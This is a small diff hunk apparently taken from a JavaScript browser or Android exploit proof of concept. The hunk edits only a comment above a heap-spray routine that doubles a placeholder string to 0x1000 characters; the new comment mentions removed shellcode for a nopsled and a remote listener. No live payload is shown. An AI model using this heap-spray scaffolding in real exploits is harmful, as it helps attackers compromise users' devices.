@@ -22,7 +22,7 @@ function sploit(pop)
 		
 function heap()
         {       
-        var scode = unescape("\ufeca\ubeba") // this is from initial Android PoC and needs to be removed
+        var scode = unescape("\ufeca\ubeba") // this is from initial Android PoC and needs to be removed, contained shellcode for nopsled and listening remotely
         do {
           scode += scode;
         } while(scode.length < 0x1000);
